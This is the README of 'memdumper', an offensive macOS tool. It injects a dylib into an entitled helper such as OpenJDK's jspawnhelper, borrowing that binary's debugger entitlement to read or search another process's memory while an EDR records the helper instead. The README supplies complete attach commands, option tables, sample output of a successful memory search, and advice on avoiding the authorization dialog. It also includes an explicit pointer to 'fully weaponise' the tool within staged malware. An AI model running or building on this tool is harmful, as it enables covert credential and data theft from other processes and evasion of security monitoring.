# memdumper

memdumper reads the memory of a running macOS process under another signed binary's debugger entitlement. The aim is that `task_for_pid` and `ptrace` run as that entitled binary, so an EDR records it rather than memdumper.

by cenobyte <vincitamorpatriae@gmail.com> 2026

https://github.com/cenobyte-vincit/memdumper

## Summary

memdumper starts an entitled binary carrying `com.apple.security.cs.debugger` plus the two entitlements that allow a `DYLD_INSERT_LIBRARIES` insert. Use it to search and dump the memory of another process as root. OpenJDK's `jspawnhelper` is a commonly found binary, especially on developer machines.

Give `attach.sh` a target PID and the entitled binary. The dylib constructor runs before that binary's `main`, reads the target, then `_exit`s. The entitled binary never reaches `main`, so a helper such as `jspawnhelper` does not print its usage banner. Extra arguments after the entitled binary stay on the command line an EDR records. Without `-s` the dylib hex-dumps the start of each readable region. With `-s` it searches those regions for the string. The target address space is not written. `ptrace` attach can stop the target briefly.

Dump status is the `[RESULT]` line on the merged output. A successful insert exits 0 after the constructor finishes.

## Requirements

### Runtime host

- macOS (Darwin)
- root
- An entitled binary with all three of `com.apple.security.cs.debugger`, `com.apple.security.cs.allow-dyld-environment-variables`, and `com.apple.security.cs.disable-library-validation` (for example OpenJDK's `jspawnhelper`)

### Build host

- macOS (Darwin) with Xcode Command Line Tools or Xcode
- `clang`
- `make`
- **shellcheck** for `attach.sh` and the test scripts (`brew install shellcheck`)
- **cppcheck** (`brew install cppcheck`)

## Build

On the build host:

```bash
make
```

That produces `memdumper.dylib`. Copy `attach.sh` and `memdumper.dylib` onto the target if the machines are not the same.

## Usage

Run `attach.sh` as root from the directory that contains `memdumper.dylib`. A non-root caller is refused before the entitled binary starts (`root required`). That avoids the Developer Tool Access password dialog (`taskgated` / Authorization Services). That dialog is not Transparency, Consent, and Control (TCC).

```bash
sudo ./attach.sh [options] -p <pid> <entitled-binary> [args...]
```

| Option | Meaning |
|--------|---------|
| `-p`, `--pid PID` | Target process ID (required) |
| `-s`, `--search STRING` | Search readable regions for STRING |
| `-n`, `--max-regions N` | Maximum readable regions to hex-dump (default 100). Dump path only |
| `-f`, `--force` | Continue when `codesign` reports Hardened Runtime |
| `-h`, `--help` | Print usage (exit 1) |

Confirm a candidate entitled binary has the three entitlements. The Cellar prefix and OpenJDK version vary; `attach.sh` uses this layout in its own help:

```bash
codesign -d --entitlements - \
	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
```

Dump readable regions of PID 4543:

```bash
sudo ./attach.sh -p 4543 \
	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
```

Search that process for `HELLO`:

```bash
sudo ./attach.sh -s HELLO -p 4543 \
	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
```

Cap the dump at 50 readable regions, using `java` as the entitled binary. `TestSpawn` stays on the command line; `java`'s `main` does not run:

```bash
sudo ./attach.sh -n 50 -p 4543 \
	/opt/homebrew/Cellar/openjdk/25.0.2/bin/java TestSpawn
```

An editor without Hardened Runtime is a working smoke target. Start it as the user who owns the buffer, then attach as root. In one terminal:

```bash
nano foo
```

Put `HELLO` in the buffer so the string is in the process (write the file or leave it unsaved). In another terminal, from the directory that holds `memdumper.dylib`:

```bash
sudo ./attach.sh -s HELLO -p "$(pgrep nano)" \
	/opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
```

A hit looks like this. The process then exits 0:

```text
Target: pid 9810 (nano)
Target has no hardened runtime

[MEMDUMPER] Injected into PID 9852 (UID 0)
[MEMDUMPER] Entitled binary: /opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper
[MEMDUMPER] Target: PID 9810 (nano)
[METHOD1] task_for_pid() on PID 9810 (nano)
[*] Got task port 0x1013
[*] Task info: virt=425098.0MB res=8.3MB
[*] Threads: 1
[MEMORY SEARCH] Looking for "HELLO" in PID 9810
MATCH at 0xa70c60200 (region: 0xa70c00000-0xa71000000, prot: rw-)
Context:
0x0000000a70c601c0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0x0000000a70c601d0: 4f 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |O...............|
0x0000000a70c601e0: 23 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |#...............|
0x0000000a70c601f0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0x0000000a70c60200: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
0x0000000a70c60210: 66 6f 6f 00 00 00 00 00  00 00 00 00 00 00 00 00  |foo.............|
0x0000000a70c60220: 6f d9 b9 83 27 dc 6a ec  00 04 00 00 00 00 00 00  |o...'.j.........|
0x0000000a70c60230: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
0x0000000a70c60240: 2e 2f 00 00 00                                    |./...|
MATCH at 0xa70c60230 (region: 0xa70c00000-0xa71000000, prot: rw-)
Context:
0x0000000a70c601f0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
0x0000000a70c60200: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
0x0000000a70c60210: 66 6f 6f 00 00 00 00 00  00 00 00 00 00 00 00 00  |foo.............|
0x0000000a70c60220: 6f d9 b9 83 27 dc 6a ec  00 04 00 00 00 00 00 00  |o...'.j.........|
0x0000000a70c60230: 48 45 4c 4c 4f 00 00 00  00 00 00 00 00 00 00 00  |HELLO...........|
0x0000000a70c60240: 2e 2f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |./..............|
0x0000000a70c60250: 66 6f 6f 00 00 00 00 00  00 00 00 00 00 00 00 00  |foo.............|
0x0000000a70c60260: 2f d9 b9 83 27 dc 6a ec  22 90 00 00 00 00 00 00  |/...'.j.".......|
0x0000000a70c60270: 00 00 00 00 00                                    |.....|
Search complete: 2 matches found in 70 regions
[METHOD2] ptrace(PT_ATTACHEXC) on PID 9810 (nano)
[*] Attached with ptrace
[*] Detached successfully
[METHOD3] proc_pidinfo() on PID 9810 (nano)
[*] Process info: virt=425098MB res=8MB threads=1
[RESULT] 3/3 methods successful - FULL ACCESS
[MEMDUMPER] Done
```

`attach.sh` does not check the entitled binary's entitlements. A binary missing any of the three fails at insert or at `task_for_pid`.

## Exit codes

| Code | Meaning |
|------|---------|
| 0 | Constructor finished after a successful insert |
| 1 | Usage error, not root, missing `memdumper.dylib` in the current directory, missing `-p`, target PID not found, Hardened Runtime without `--force`, or the insert did not happen (the entitled binary then ran and exited non-zero) |

Read `[RESULT]` for dump outcome. Exit 0 only means the constructor ran and `_exit`ed.

## Configuration

The dylib reads three environment variables. `attach.sh` sets them from the flags.

| Variable | Set by | Meaning |
|----------|--------|---------|
| `MEMDUMPER_TARGET_PID` | `-p` | Target PID. If unset or not a positive integer, the constructor prints a diagnostic and returns |
| `MEMDUMPER_SEARCH` | `-s` | If non-empty, search instead of dump |
| `MEMDUMPER_MAX_REGIONS` | `-n` | Readable regions to hex-dump (default 100). Ignored on the search path |

Any starter that sets `DYLD_INSERT_LIBRARIES` to `memdumper.dylib` and those variables can inject the dylib. `attach.sh` is the in-tree starter.

## Verify

On the build host, `make` builds the dylib and runs **cppcheck** plus **shellcheck**. `make test` runs the unit tests and the functional suite. These checks are not a clean-runtime proof.

The live search and dump tests need Homebrew OpenJDK and uid 0. They `find` `jspawnhelper` under `/opt/homebrew/Cellar` and `/usr/local/Cellar` (no version pin). They do not call `sudo` themselves. Without Homebrew OpenJDK, or if the suite is not already uid 0, those two cases skip (exit 77), so a non-root `make test` does not present Developer Tool Access. Use `sudo make test` when you want those injects to run.

```bash
make
make test
sudo make test
make test-unit
make test-functional
```

## Limitations

- Hardened Runtime blocks `task_for_pid`, `ptrace`, and the memory read (1Password, Chrome). `--force` still tries and almost always fails.
- The runtime host requires root. A non-root same-UID attach presents the Developer Tool Access password dialog: `taskgated` evaluates Authorization Services right `system.privilege.taskport`. That dialog is not TCC. Developer Mode (`DevToolsSecurity -enable`) plus membership of `admin` or `_developer` does not suppress it for Homebrew `jspawnhelper` (adhoc, public debugger entitlement). It only skips the password for Apple-signed tools such as `lldb`. System Integrity Protection (SIP) keeps protected system processes out of reach even as root.
- Some processes (including `bash`) refuse the attach through other checks.
- `attach.sh` looks for `memdumper.dylib` in the current working directory, not next to the script. To fully weaponise this, implement that starter in stage 1 or stage 2 rather than shipping `attach.sh`.
- Search reads at most 10 MiB of each readable region and walks at most 1000 regions. The dump walk stops after 10000 regions and prints only the first 256 bytes of each displayed region (`-n` / `MEMDUMPER_MAX_REGIONS`, default 100).
- `ptrace` is attach and detach only. It does not dump memory. `[RESULT] 3/3` means all three calls succeeded, not that three dump paths ran.
- CrowdStrike Falcon for macOS logs process environment variables, including `DYLD_INSERT_LIBRARIES`. Threat hunters use that field to spot this insert.
- One target PID per invocation.

## See also

- ARCHITECTURE.md: entitlement inheritance, taskgated and `system.privilege.taskport`, the three methods, what an EDR records
- AGENTS.md: build host versus target
